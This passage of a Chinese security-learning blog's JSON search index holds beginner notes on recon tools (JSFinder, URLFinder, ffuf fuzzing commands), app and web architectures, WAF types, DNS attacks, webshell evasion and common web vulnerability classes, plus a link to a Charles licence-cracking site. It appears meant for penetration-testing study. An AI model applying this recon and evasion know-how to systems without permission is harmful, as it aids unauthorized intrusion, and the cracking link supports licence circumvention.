开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。\nJS 网络扫描工具：JSFinder，URLFinder，ffuf-FUZZ，Packer-Fuzzer，Findsomething\n1，JSFinder: 一款用作快速在网站的 js 文件中提取 URL，子域名的工具。\nhttps://github.com/Threezh1/JSFinder\n2，URLFinder: 更专注于提取页面中的 JS 与 URL 链接，提取的数据更完善且可查看状态码、内容大小、标题等\nhttps://github.com/pingc0y/URLFinder\ntxtURLFinder.exe -u http://www.baidu.com -s all -m 23，ffuf-FUZZ：爆破找到更多的 js 文件分析更多的信息https://github.com/ffuf/ffuf\nhttps://wordlists.assetnote.io （下载字典网址）功能强大的模糊化工具，用它来 FUZZ 模糊化 js 文件。\ntxtffuf.exe -w 字典.txt -u &lt;域名&gt;/FUZZ -t 200 -of csv -o 2.csv4，Packer-Fuzzer：一款针对 Webpack 等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具。\nhttps://github.com/rtcatc/Packer-Fuzzer\n5，Findsomething：从表现中 JS 中提取 URL 或者敏感数据（包括请求的资源、接口的 url，请求的 ip 和域名，泄漏的证件号、手机号、邮箱等信息。）\nhttps://github.com/momosecurity/FindSomething\n\n","slug":"信息收集-1","date":"2025-05-16T12:51:46.055Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"33a92f9ed251723a6f6350c703d02fa8","title":"抓包","content":"基础知识-抓包技术常用工具：burpsuite，charles （两工具可配合使用）\nCharles 破解网站\nhttps://www.zzzmode.com/mytools/charles\n自行百度，没啥可讲\n","slug":"抓包","date":"2025-05-16T12:49:58.517Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"594eeda5be42f7149d59aeeccc66f0a2","title":"app base","content":"基础知识-APP架构APP 应用开发架构：\n1，原生（java）开发\n安卓一般使用 java 语言开发，当然也有使用 kotlin 语言进行开发。\n2，使用 H5 语言开发\nH5 页面可以在任何支持 HTML5 标准的浏览器上运行，无需针对不同的操作系统进行开发。\n易于传播：H5 页面可以通过链接分享，方便用户在社交媒体等平台上进行传播。\n开发成本低：相较于 App 和小程序，H5 页面的开发成本较低，因为可以使用一套代码实现跨平台访问\n3，使用 flutter 开发\nflutter 是谷歌推出的一款 UI 框架，使用 dart 语言进行开发，支持跨平台 weight 渲染直接操作硬件层，体验可媲美原生\n4，常规 Web 开发\nWeb App 软件开发简单来说，就是开发一个网站，然后加入 app 的壳，内容都是 app 内的网页展示，受制于网页技术本身，可实现的功能少，而且每次点开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多容易卡死，体验差\n1，APP - 开发架构 - 原生态 - IDEA\n安全影响：反编译 &amp; 抓包 &amp; 常规测试（逆向的角度去分析逻辑设计安全）\n2，APP - 开发框架 - H5&amp;Vue-HBuilderX\n安全影响：API&amp;JS 框架安全问题 &amp; js 前端测试\n3，WX - 小程序 - 开发架构 - Web 封装 - 平台\n安全影响：常规 web 安全测试\n4，WX - 小程序 - 开发框架 - H5&amp;Vue-HBuilderX\n安全影响：API&amp;JS 框架安全问题 &amp; JS 前端测试\n","slug":"app-base","date":"2025-05-16T12:47:59.079Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"fce321c34fbbe2a41087759c5e15dc0b","title":"web搭建","content":"基础知识-WEB网页搭建常规化：\n\n原理：源码数据都在服务器中\n影响：使用常规的安全测试手法\n\n站库分离：\n\n原理：数据源码不在同一服务器上\n存储：其他服务器上 &amp; 云数据产品\n影响：数据被单独存放，能连接才可能影响数据\n\n前后端分类：\n\n原理：前端 js 框架，API 传输数据\n影响：1，前端页面大部分不存在漏洞 2，后端管理大部分不在同一域名 3，获得的权限有可能 1 不影响后端\n\n集成软件：\n\n原理：打包类集成化环境，权限配置或受控制\n影响：攻击者权限对比区别\n\nDocker 容器：\n\n原理：虚拟化技术独立磁盘空间，非真实物理环境\n\n影响：攻击者虚拟空间磁盘\n\n搭站平台：\n\n模式：1，托管 2，申请\n\n原理：利用别人域名模板建立\n\n影响：实质安全测试非资产目标\n\n\n纯静态：\n\n例子：大学学的 html 设计网页\n原理：数据没有传输性（js 传输不算）\n影响：无漏洞\n\n伪静态：动态为静态技术，伪装的静态\nWAF\n非嵌入型：\n\n硬件型：以硬件形式部署在链路中，支持多种部署方式，当串联到链路中可以拦截恶意流量，在旁路监听时只做记录不拦截（Imperva，天清 WAG 等）\n软件型：以软件形式安装在服务器上，可以直接检测服务器是否存在 webshell，是否有文件被创建等（安全狗，云锁，D 盾等）\n云 WAF：一般以反向代理的形式工作，通过配置 NS 或 CNAME 记录，使得对网站的请求报文优先经过 WAF 主机（阿里云云盾，腾讯云 WAF 等）\n\n嵌入式：\n网站内置的 WAF：直接嵌入在代码中，安全人员在可能受到攻击的地方增强一些安全防护代码，比如过滤敏感字符\nCDN\n\n原理：内容分发服务，提到访问速度\nOSS\n\nOSS\n\n原理：云存储服务，提高资源文件加载速度\n影响：资源单独存储，修复上传漏洞 文件解析不复存在 同时也会有 Accesskey 泄露安全问题影响：隐藏真实 ip\n\n反向代理\n\n原理：通过网络反向代理转发真实服务达到访问目的\n影响：访问目标只是一个代理，非真实应用服务器\n\n负载均衡\n\n原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务器记载服务，测试过程中存在多个目标情况\n\n","slug":"WEB网页搭建","date":"2025-05-16T12:33:20.573Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"ff91b050b55d35fbf6b529d19370e282","title":"Http","content":"Http 和 Https数据包可以看此文章：https://www.runoob.com/w3cnote/http-vs-https.html\n","slug":"http-base","date":"2025-05-16T12:23:28.278Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"46426c79fe8370cebf57bb63c792f570","title":"hello","content":"没有什么东西","slug":"hello","date":"2025-05-16T11:48:45.000Z","categories_index":"乱七八槽","tags_index":"乱七八糟","author_index":"Hao"},{"id":"9bb30c0c918f89cc2cd8ad7521e47e07","title":"概念名词","content":"概念名词1，域名域名（Domain Name）是互联网中用于标识网站的名称，它是一串易于记忆的字符，代替了复杂的 IP 地址，使用户能够更方便地访问互联网上的资源。域名通过将用户输入的文字转换为相应的 IP 地址，帮助用户定位和访问目标网站。‌例如：www.example.com\n\n顶级域名（TLD）‌：这是域名的最后一部分，例如 “.com”、“.net” 或 “.org”。顶级域名通常代表不同的组织类型或地域。\n二级域名（SLD）‌：紧接在顶级域名前的部分，例如 “example” 在 “example.com” 中就是二级域名。\n‌子域名‌：位于二级域名前面，用于进一步划分域名。例如 “blog.example.com” 中的 “blog” 就是子域名。\n\n域名发现对于安全测试的意义：某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。\n例如：www.xxxxx.com 主域不存在漏洞，并且防御措施严密。而二级域名 edu.xxxxx.com 存在漏洞，并且防护措施松散。\n里面就可能存在漏洞，加以利用可以突破到主站的权限。简单来说，多级域名收集的意义，就是一个网站找不到漏洞时，可以找跟它服务器相同的另一个多级域名上的漏洞，做旁路攻击。这就是旁站入侵。\n2，DNSDNS（Domain Name System）是互联网的一项核心服务，其主要功能是将方便记忆的域名（如 example.com）转换为计算机能够识别的 IP 地址（如 192.0.2.1）。这种映射关系使得用户无需记住复杂的数字地址，只需输入域名即可访问目标资源。\n本地 HOSTS 与 DNS 的关系本地 HOSTS 重定向解析 IP 地址，如果网络在解析 IP 地址的时候，ping 这个网站的时候，先到 hosts 文件去看看，有没有对域名对应的 IP 地址，没有的话再去 DNS 服务器上去解析。如果去绑定 IP 地址，可以用这个方法，或者修改 hosts 文件，就能让对方指到此 IP 地址上去，类似于钓鱼攻击。hosts 文件所在的位置：C：\\Windows\\System32\\drivers\\etc\\hosts\nlinux 文件所在位置：&#x2F;etc&#x2F;hosts\nCDN 是什么？与 DNS 的关系？CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。\nCDN 作用： 访问的时候找一个网络最好，通讯最快的节点，访问网络时是访问一个节点，用来解决访问速度。\nCDN 缺点： 由于有节点，访问网络时，请求的是一个节点，真实数据和网络相关核心不在节点上，节点相当于缓存。\n两者之间关系： 更改 DNS 服务器，就相当于有可能访问到另一个节点。\n常见的 DNS 攻击域名劫持通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的 NS 纪录指向到黑客可以控制的 DNS 服务器，然后通过在该 DNS 服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。\n缓存投毒利用控制 DNS 缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。\nDDOS 攻击一种攻击针对 DNS 服务器软件本身，通常利用 BIND 软件程序中的漏洞，导致 DNS 服务器崩溃或拒绝服务；另一种攻击的目标不是 DNS 服务器，而是利用 DNS 服务器作为中间的 “攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。\nDNS 欺骗DNS 欺骗就是攻击者冒充域名服务器的一种欺骗行为。\n3，HTTP 和 HTTPS 区别\n‌安全性‌：HTTP 是明文传输，HTTPS 通过加密保护数据。\n‌证书‌：HTTPS 需要 CA 颁发的证书，而 HTTP 不需要。\nHTTPS 由于加密和解密过程，可能比 HTTP 稍慢，但现代技术已大大缩小了这一差距。\n\n4，后门后门：可以理解为攻击者，在得到相关的非法入侵后，留下后门文件，便于下次进行操作，拿到权限。后门文件：网站后门 (webshell)，服务器后门等其他类型的后门。\n关于后门需要了解哪些？（玩法，免杀）玩法（要能够隐藏自己），免杀（网站有杀毒软件，大部分有杀后门功能，会检测并删除，免杀就是不被检测到）\n5，WEB网站源码：分脚本类型、分应用方向操作系统：windows、linux中间件（搭建平台）：apache、iis、tomcat、nginx 等数据库：access、mysql、mssql、oracle、sybase、db2、postsql 等\nWEB 相关安全漏洞\n1、SQL 注入\nSQL 注入攻击的核心在于让 Web 服务器执行攻击者期望的 SQL 语句，以便得到数据库中的感兴趣的数据或对数据库进行读取、修改、删除、插入等操作，达到其邪恶的目的。\n2、XSS 攻击\nXSS 攻击的核心是将可执行的前端脚本代码（一般为 JavaScript）植入到网页中，听起来比较拗口，用大白话说就是攻击者想让你的浏览器执行他写的 JS 代码\n3、CSRF 攻击\nCSRF，跨站请求伪造，其核心思想在于，在打开 A 网站的情况下，另开 Tab 页面打开恶意网站 B，此时在 B 页面的 “唆使” 下，浏览器发起一个对网站 A 的 HTTP 请求\n4、DDoS 攻击\nDDoS 全称 Distributed Denial of Service：分布式拒绝服务攻击。是拒绝服务攻击的升级版。拒绝攻击服务顾名思义，让服务不可用。\n5、DNS 劫持\n6、JSON 劫持\nJSON 是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特定的手段，将本应该返回给用户的 JSON 数据进行拦截，转而将数据发送回给恶意攻击者\n7、暴力破解\n8、信息泄露\n由于 Web 服务器或应用程序没有正确处理一些特殊请求，泄露 Web 服务器的一些敏感信息，如用户名、密码、源代码、服务器信息、配置信息等。\n9、目录遍历漏洞\n攻击者向 Web 服务器发送请求，通过在 URL 中或在有特殊意义的目录中附加 ..&#x2F;、或者附加 ..&#x2F; 的一些变形（如 ..\\ 或 ..&#x2F;&#x2F; 甚至其编码），导致攻击者能够访问未授权的目录，以及在 Web 服务器的根目录以外执行命令。\n10，命令执行漏洞\n命令执行漏洞是通过 URL 发起请求，在 Web 服务器端执行未授权的命令，获取系统信息、篡改系统配置、控制整个系统、使系统瘫痪等。\n11、文件上传漏洞\n如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。\n12、其他漏洞\nSSLStrip 攻击OpenSSL Heartbleed 安全漏洞CCS 注入漏洞证书有效性验证漏洞13、业务漏洞\n一般业务漏洞是跟具体的应用程序相关，比如参数篡改（连续编号 ID &#x2F; 订单、1 元支付）、重放攻击（伪装支付）、权限控制（越权操作）等。\n14、框架或应用漏洞\n15，XEE 漏洞\nXXE 漏洞全称 XML External Entity Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。\n","slug":"Concept-name","date":"2025-05-16T10:42:06.923Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"}]